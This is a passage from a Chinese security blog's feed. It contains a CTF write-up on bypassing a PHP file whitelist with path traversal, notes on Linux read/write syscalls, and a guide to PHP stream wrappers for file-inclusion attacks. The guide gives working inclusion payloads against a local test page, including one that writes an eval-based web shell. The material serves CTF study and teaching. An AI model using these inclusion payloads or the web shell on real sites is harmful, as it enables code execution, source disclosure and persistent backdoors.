class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ①</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先会执行<code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>，该函数会返回输入字符串之后加上<code>?</code>之后的首次出现<code>?</code>的位置，<code>mb_substr</code>函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为②</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③</p></blockquote><h4 id="3-构造payload-2"><a href="#3-构造payload-2" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③</p><p>② 处的payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?(payload) 或者为 ?file=source.php%3F(payload)</span><br></pre></td></tr></table></figure><p>③ 处的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253F(payload)</span><br></pre></td></tr></table></figure><p>下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现<code>ffffllllaaaagggg</code>在/../../../../ffffllllaaaagggg中，所以payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%3F/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h4 id="4-目录遍历问题"><a href="#4-目录遍历问题" class="headerlink" title="4.目录遍历问题"></a><code>4.目录遍历问题</code></h4><p>经过测试发现并确定，这种包含的前提是<code>包含的文件必须是当前文件夹不存在的文件</code>，<strong>只有这样才会将该文件解析成目录</strong>，从而遍历其他文件；此处<font color="navy"><strong>hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次<code>../</code>仅仅又是回到当前source.php的目录下</strong></font>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">目录遍历</th><th style="text-align:left">解析</th></tr></thead><tbody><tr><td style="text-align:left">../</td><td style="text-align:left">/var/www/html</td></tr><tr><td style="text-align:left">../../</td><td style="text-align:left">/var/www</td></tr><tr><td style="text-align:left">../../../</td><td style="text-align:left">/var</td></tr><tr><td style="text-align:left">../../../../</td><td style="text-align:left">/</td></tr></tbody></table></div><p>此外，在<code>Windows</code>下<code>hint.php?</code>无法被解析为目录，在<code>linux</code>下成功认为是目录，原因为Windows系统文件命名不支持问号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-函数漏洞问题&quot;&gt;&lt;a href=&quot;#0x00-函数漏洞问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 函数漏洞问题&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 函数漏洞问题&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF中常见的函数总结</title>
    <link href="https://muzibing.github.io/2020/07/27/2020.07.27%EF%BC%88141%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/27/2020.07.27（141）/</id>
    <published>2020-07-26T16:00:00.000Z</published>
    <updated>2020-07-27T10:54:59.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-pwn题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pwn题font"></a> <font color="navy"><code>0x00 pwn题</code></font></h2><h3 id="font-color-blue1open函数font"><a class="markdownIt-Anchor" href="#font-color-blue1open函数font"></a> <font color="blue"><code>1.open()函数</code></font></h3><h4 id="函数原型"><a class="markdownIt-Anchor" href="#函数原型"></a> <code>函数原型</code></h4><blockquote><p><code>int open(const char *path, int flags,int mode)；</code></p></blockquote><p><code>flags</code></p><table><thead><tr><th style="text-align:center">常量名称</th><th style="text-align:center">数字</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">O_RDONLY</td><td style="text-align:center">0</td><td style="text-align:center">只读模式</td></tr><tr><td style="text-align:center">O_WRONLY</td><td style="text-align:center">1</td><td style="text-align:center">只写模式</td></tr><tr><td style="text-align:center">O_RDWR</td><td style="text-align:center">2</td><td style="text-align:center">可读可写</td></tr></tbody></table><h4 id="函数功能"><a class="markdownIt-Anchor" href="#函数功能"></a> <code>函数功能</code></h4><blockquote><p>以各种方式打开文件</p></blockquote><h4 id="函数返回值"><a class="markdownIt-Anchor" href="#函数返回值"></a> <code>函数返回值</code></h4><blockquote><p>如果调用成功，它将返回一个可以被<code>read</code>和<code>write</code>等其他系统调用使用的<font color="red"><code>文件描述符</code></font>。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’</p></blockquote><p><code>返回的文件描述符</code></p><blockquote><p>fd的值一般是<code>3</code>开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。</p></blockquote><h4 id="系统调用号"><a class="markdownIt-Anchor" href="#系统调用号"></a> <code>系统调用号</code></h4><blockquote><p><code>2 open sys_open fs/open.c</code></p></blockquote><h3 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h3><h4 id="头文件"><a class="markdownIt-Anchor" href="#头文件"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-2"><a class="markdownIt-Anchor" href="#函数原型-2"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p></blockquote><h4 id="函数功能-2"><a class="markdownIt-Anchor" href="#函数功能-2"></a> <code>函数功能</code></h4><blockquote><p>读取文件内容：<strong>read()会把参数<code>fd</code>所指的文件传送 <code>count</code>个字节到buf 指针所指的内存中</strong>。</p></blockquote><h4 id="函数返回值-2"><a class="markdownIt-Anchor" href="#函数返回值-2"></a> <code>函数返回值</code></h4><blockquote><p>参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动：</p><ul><li>当文件的整体字节比<code>count</code>小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。</li><li>当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。</li></ul></blockquote><h4 id="测试用例"><a class="markdownIt-Anchor" href="#测试用例"></a> <code>测试用例</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY);<span class="comment">//只读模式打开文件</span></span><br><span class="line">    res = read(fp,buffer,<span class="number">60</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bits,they are %s\n"</span>,res,buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strerror(errno));</span><br><span class="line">    close(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用号-2"><a class="markdownIt-Anchor" href="#系统调用号-2"></a> <code>系统调用号</code></h4><blockquote><p><code>0 read sys_read fs/read_write.c</code></p></blockquote><h3 id="font-color-blue3write函数font"><a class="markdownIt-Anchor" href="#font-color-blue3write函数font"></a> <font color="blue"><code>3.write()函数</code></font></h3><h4 id="头文件-2"><a class="markdownIt-Anchor" href="#头文件-2"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-3"><a class="markdownIt-Anchor" href="#函数原型-3"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t write(int fd,const void *buf, size_t count);·</code></p><ul><li><strong>fd</strong>：是文件描述符（write所对应的是写，即就是1，这是标准输出）</li><li><strong>buf</strong>：通常是一个字符串，需要写入的字符串</li><li><strong>count</strong>：是每次写入的字节数</li></ul></blockquote><h4 id="函数功能-3"><a class="markdownIt-Anchor" href="#函数功能-3"></a> <code>函数功能</code></h4><blockquote><p>打印文件内容</p></blockquote><h4 id="函数返回值-3"><a class="markdownIt-Anchor" href="#函数返回值-3"></a> <code>函数返回值</code></h4><blockquote><ul><li><p>成功：返回读出的字节数</p></li><li><p>失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0</p></li></ul></blockquote><h4 id="系统调用号-3"><a class="markdownIt-Anchor" href="#系统调用号-3"></a> <code>系统调用号</code></h4><blockquote><p><code>1 write sys_write fs/read_write.c</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-pwn题font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-pwn题font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T07:00:53.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><ul><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p></li></ul><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<strong>|</strong>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p></li></ul><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td style="text-align:left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td style="text-align:left">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ul><li><strong>示例</strong>：</li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navy0x05-phar-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-phar-协议font"></a> <font color="navy"><code>0x05 phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="font-color-navy0x06-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-参考文章font"></a> <font color="navy"><code>0x06 参考文章</code></font></h3><p><a href="https://zhuanlan.zhihu.com/p/25069779" target="_blank" rel="noopener">文件包含漏洞原理分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-08-17T14:27:59.670Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="692903eb44847d6e7ca78b57bc76c46b1bb17cf17332e58bde7c47c7b09844a9"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
